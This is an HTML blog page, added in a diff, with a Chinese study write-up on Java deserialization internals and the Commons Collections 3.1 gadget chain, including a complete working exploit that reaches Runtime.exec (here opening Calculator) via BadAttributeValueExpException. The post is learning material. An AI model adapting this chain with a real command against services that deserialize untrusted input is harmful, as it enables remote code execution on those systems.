@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="osword&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      Java反序列化学习之反序列化流程及反射类源码分析学习 | osword&#39;s blog
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>osword's blog</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/links/" class="item-link">Links</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/links/" class="menu-link">Links</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>Java反序列化学习之反序列化流程及反射类源码分析学习</h2>
+  <p class="post-date">2020-02-07 - 
+<span id="busuanzi_container_page_pv" style="color: #fff; margin-left: 0px">阅读量<span id="busuanzi_value_page_pv"></span>次
+        </span></p>
+<div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>闲着也是闲着入门下java反序列化</p>
+<p>通篇文章更多是借用commonscollections学习反序列化和反射的源码</p>
+<h1 id="触发反序列化"><a href="#触发反序列化" class="headerlink" title="触发反序列化"></a>触发反序列化</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject<span class="comment">// 流转化为Object</span></span><br><span class="line">ObjectInputStream.readUnshared <span class="comment">// 流转化为Object</span></span><br><span class="line">XMLDecoder.readObject <span class="comment">// 读取xml转化为Object</span></span><br><span class="line">Yaml.load<span class="comment">// yaml字符串转Object</span></span><br><span class="line">XStream.fromXML<span class="comment">// XStream用于Java Object与xml相互转化</span></span><br><span class="line">ObjectMapper.readValue<span class="comment">// jackson中的api</span></span><br><span class="line">JSON.parseObject<span class="comment">// fastjson中的api</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="反序列化过程"><a href="#反序列化过程" class="headerlink" title="反序列化过程"></a>反序列化过程</h1><p>Demo</p>
+<p>Human类实现Serializable接口用来序列化，主类showunserial实现Human类的序列化和反序列化.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">showunserial</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        Human human = <span class="keyword">new</span> Human();</span><br><span class="line">        human.name=<span class="string">"xiaoming"</span>;</span><br><span class="line">        human.age=<span class="number">18</span>;</span><br><span class="line">        File f = <span class="keyword">new</span> File(<span class="string">"/tmp/human.ser"</span>);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(f));</span><br><span class="line">        <span class="comment">//将对象输出为字节流</span></span><br><span class="line">        out.writeObject(human);</span><br><span class="line">        out.close();</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        FileInputStream fileInputStream = <span class="keyword">new</span> FileInputStream(<span class="string">"/tmp/human.ser"</span>);</span><br><span class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(fileInputStream);</span><br><span class="line">        Human e = <span class="keyword">null</span>;</span><br><span class="line">        e = (Human) in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span> <span class="keyword">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        System.out.println(<span class="string">"name: "</span>+ name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里利用<code>ObjectInputStream</code>类的<code>readObject</code>方法反序列化<code>Human</code>类.接着会去调用底层的反序列化方法<code>readObject0</code>方法</p>
+<p><img src="./image-20200206205257856.png" alt="image-20200206205257856"></p>
+<p>readObject0关键代码如下,选择对象类型，根据不同类型执行操作。</p>
+<p><img src="./image-20200206211328795.png" alt="image-20200206211328795"></p>
+<p><code>case</code> 进入<code>TC_OBJECT</code>，执行<code>readOrdinaryObject</code>方法.该方法返回一个<code>obj对象</code>。跟进<code>readClassDesc</code>方法，该方法可以加载Human类的各个属性.调用栈如下</p>
+<p><img src="./image-20200207004405873.png" alt="image-20200207004405873"></p>
+<p><img src="./image-20200207004337661.png" alt="image-20200207004337661"></p>
+<p><code>readOrdinaryObject</code>方法继续执行,判断需要反序列化的<code>Human</code>类是否可以实例化，是则调用<code>newInstance</code>方法.</p>
+<p><img src="./image-20200206211831099.png" alt="image-20200206211831099"></p>
+<p>接着执行<code>readSerialData</code>，这里重要是<code>else if</code>语句判断反序列化类是否重写<code>readObject</code>方法,有重写则执行<code>invokeReadObject</code>反射调用重写的<code>readObject</code>方法.</p>
+<p><img src="./image-20200207024346739.png" alt="image-20200207024346739"></p>
+<p>反序列攻击时序图(@廖师傅)</p>
+<p><img src="http://rui0.cn/wp-content/uploads/2018/07/SequenceDiagram1.png" alt="SequenceDiagra"></p>
+<h1 id="CommonsCollections"><a href="#CommonsCollections" class="headerlink" title="CommonsCollections"></a>CommonsCollections</h1><p>该反序列化漏洞点主要利用是<code>InvokerTransformer.transform()</code>方法可调用反射类且类变量可控导致RCE.</p>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-collections&lt;&#x2F;groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections&lt;&#x2F;artifactId&gt;</span><br><span class="line">    &lt;version&gt;3.1&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>摘自：<a href="https://p0sec.net/index.php/archives/121/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/121/</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="comment">//传入Runtime类</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line"><span class="class">                //反射调用<span class="title">getMethod</span>方法，然后<span class="title">getMethod</span>方法再反射调用<span class="title">getRuntime</span>方法，返回<span class="title">Runtime</span>.<span class="title">getRuntime</span>()方法</span></span><br><span class="line">                new InvokerTransformer("getMethod",</span><br><span class="line">                        new Class[] &#123;String.class, Class[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</span><br><span class="line">                        new Class[] &#123;Object.class, Object[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String<span class="class">.<span class="keyword">class</span> &#125;,</span></span><br><span class="line">                        new Object[] &#123;"open /System/Applications/Calculator.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"foo"</span>);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException poc = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// val是私有变量，所以利用下面方法进行赋值</span></span><br><span class="line">        Field valfield = poc.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        valfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valfield.set(poc, entry);</span><br><span class="line"></span><br><span class="line">        File f = <span class="keyword">new</span> File(<span class="string">"poc.txt"</span>);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(f));</span><br><span class="line">        out.writeObject(poc);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//从文件中反序列化obj对象</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"poc.txt"</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        <span class="comment">//恢复对象</span></span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><code>InvokerTransformer.transform()</code>中<code>input</code>可控,且能够调用反射类执行<code>input</code>对象方法.</p>
+<p><img src="./image-20200207025834248.png" alt="image-20200207025834248"></p>
+<p>Java中执行系统命令需要调用<code>Runtime.getRuntime.exec()</code>方法.正常写法，但是并不会有程序员直接调用<code>transform</code>且其中参数可控，如下并不通用。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open /System/Applications/Calculator.app"&#125;);</span><br><span class="line">        invokerTransformer.transform(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>ysoserial</strong>工具中<strong>commoncollections1 Payload</strong>利用<code>ChainedTransformer.transform</code>方法,该类能够接受Transformer接口类型的数组，且执行的<code>transform</code>方法循环回调.利用此先传入<code>Runtime.getRuntime()</code>调用反射类返回一个<code>Runtime</code>实例,在循环一次调用<code>exec</code>方法.</p>
+<p><img src="./image-20200207031345268.png" alt="image-20200207031345268"></p>
+<p><img src="./image-20200207031251470.png" alt="image-20200207031251470"></p>
+<p>poc修改后如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test2</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="comment">//传入Runtime类</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line"><span class="class">                //反射调用<span class="title">getMethod</span>方法，然后<span class="title">getMethod</span>方法再反射调用<span class="title">getRuntime</span>方法，返回<span class="title">Runtime</span>.<span class="title">getRuntime</span>()方法</span></span><br><span class="line">                new InvokerTransformer("getMethod",</span><br><span class="line">                        new Class[] &#123;String.class, Class[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</span><br><span class="line">                        new Class[] &#123;Object.class, Object[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String<span class="class">.<span class="keyword">class</span> &#125;,</span></span><br><span class="line">                        new Object[] &#123;"open /System/Applications/Calculator.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">      transformerChain.transform(<span class="string">"input"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="./image-20200207032711428.png" alt="image-20200207032711428"></p>
+<p>debug分析，反射类第一个调用如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>,</span><br><span class="line">                        new Class[] &#123;String.class, Class[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;)</span><br></pre></td></tr></table></figure>
+
+<p>执行tranform反射类执行getClass获取合法类名，接着执行getMethod获取方法名，再调用invoke方法执行方法.</p>
+<p><img src="./image-20200207032834363.png" alt="image-20200207032834363"></p>
+<p>一开始我不明白为啥<code>iMethdName</code>字段赋值为<code>getMethod</code>,</p>
+<p>debug跟进<code>Method method = cls.getMethod(iMethodName, iParamTypes);</code></p>
+<p>底层调用<code>getMethod0</code>方法</p>
+<p><img src="./image-20200207032610303.png" alt="image-20200207032610303"></p>
+<p>根据返回值跟进<code>privateGetMethodRecursive</code>方法,接着跟进<code>privateGetDeclaredMethods</code>方法，该方法获取VM中所有的方法。</p>
+<p><img src="./image-20200207033703562.png" alt="image-20200207033703562"></p>
+<p>继续调用<code>searchMethods</code>方法匹配<code>getMethod</code>，返回反射类中的<code>getMethod</code>方法.</p>
+<p><code>public java.lang.reflect.Method java.lang.Class.getMethod(java.lang.String,java.lang.Class[]) throws java.lang.NoSuchMethodException,java.lang.SecurityException</code></p>
+<p><img src="./image-20200207034408487.png" alt="image-20200207034408487"></p>
+<p>再来看最后执行的<code>return method.invoke(input, iArgs);</code>，根据调用栈显示<code>invoke0</code>方法会在执行一次反射类的<code>getMehod</code>方法,并进一步搜索getRuntime方法,返回Runtime.getRuntime方法</p>
+<p><img src="./image-20200207035124469.png" alt="image-20200207035124469"></p>
+<p>借此第一次调用反射类就能够得到Runtime.getRuntime方法。但是要得到Runtime对象需要执行<code>Runtime.getRuntime</code>方法。这就有了第二次反射类调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</span><br><span class="line">        new Class[] &#123;Object.class, Object[].class &#125;,</span><br><span class="line">        <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br></pre></td></tr></table></figure>
+
+<p>这里直接看这里<code>return method.invoke(input, iArgs);</code>执行过程,</p>
+<p>底层invoke0调用反射类的invoke方法将Runtime.getRuntime()方法当作参数.</p>
+<p><img src="./image-20200207040920312.png" alt="image-20200207040920312"></p>
+<p>由于二次调用invoke方法，会再执行invoke0方法，这里就可以直接执行Runtime.getRuntime().至此就能够返回Runtime对象.</p>
+<p><img src="./image-20200207041134155.png" alt="image-20200207041134155"></p>
+<p>最后接着就可以执行exec方法，开启计算器.</p>
+<p>执行流程类比</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">runtime</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException </span>&#123;</span><br><span class="line">        Object obj = Runtime<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">        Class cls = obj.getClass();</span><br><span class="line">        Method method;</span><br><span class="line">        method = cls.getMethod("getMethod",new Class[] &#123;String.class, Class[].class &#125;);</span><br><span class="line">        obj = method.invoke(obj, <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;);</span><br><span class="line">        cls = obj.getClass();</span><br><span class="line">        method = cls.getMethod("invoke",new Class[] &#123;Object.class, Object[].class &#125;);</span><br><span class="line">        obj = method.invoke(obj, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;);</span><br><span class="line">        cls = obj.getClass();</span><br><span class="line">        method = cls.getMethod(<span class="string">"exec"</span>,<span class="keyword">new</span> Class[] &#123; String<span class="class">.<span class="keyword">class</span> &#125;)</span>;</span><br><span class="line">        method.invoke(obj, <span class="keyword">new</span> String[] &#123; <span class="string">"open /System/Applications/Calculator.app"</span> &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>那么如何利用这个利用链，理想情况下是直接readObject方法直接反序列化或其他触发函数。考虑内置类中的readObject重写且能够相继调用transform方法触发RCE.</p>
+<p>exp利用LazyMap类get方法能够执行transform.</p>
+<p><img src="./image-20200207051857286.png" alt="image-20200207051857286"></p>
+<p>利用TiedMapEntry类toString中的getValue方法执行get方法.</p>
+<p><img src="./image-20200207052110217.png" alt="image-20200207052110217"></p>
+<p>最后需要找到触发toString的点，定位到<code>BadAttributeValueExpException</code>类,执行toString方法</p>
+<p><img src="./image-20200207052208864.png" alt="image-20200207052208864"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>java 反序列化太难写了，前前后后调试很久，稍微理解了反序列化机制和commoncollections反序列化流程.</p>
+<ol>
+<li><p>反序列化优先调用重写readObject</p>
+</li>
+<li><p>利用反射机制可以构造任意类和任意方法并执行</p>
+</li>
+<li><p>java中类变量赋值通过相应的方法赋值或者直接传入实现.</p>
+</li>
+</ol>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://docs.oracle.com/javase/8/docs/api/" target="_blank" rel="noopener">https://docs.oracle.com/javase/8/docs/api/</a></p>
+<p><a href="https://p0sec.net/index.php/archives/121/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/121/</a></p>
+<p><a href="https://blog.0kami.cn/2019/10/24/study-java-deserialized-commonscollections3-1/" target="_blank" rel="noopener">https://blog.0kami.cn/2019/10/24/study-java-deserialized-commonscollections3-1/</a></p>
+<p><a href="http://rui0.cn/archives/tag/java/page/2" target="_blank" rel="noopener">http://rui0.cn/archives/tag/java/page/2</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/64342725" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/64342725</a></p>
+<p><a href="https://juejin.im/post/5c4d5cc651882524b333d1a0" target="_blank" rel="noopener">https://juejin.im/post/5c4d5cc651882524b333d1a0</a></p>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#JAVA" >
+    <span class="tag-code">JAVA</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2020/01/28/%E5%9F%9F%E6%B8%97%E9%80%8F-VulnStack-%E7%BA%A2%E6%97%A5%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%E4%B8%80/">
+        <span class="nav-arrow">← </span>
+        
+          [域渗透]VulnStack 红日红队实战系列(一)
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2020/02/09/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections1/">
+        
+          Java反序列化学习之CommonsCollections1
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
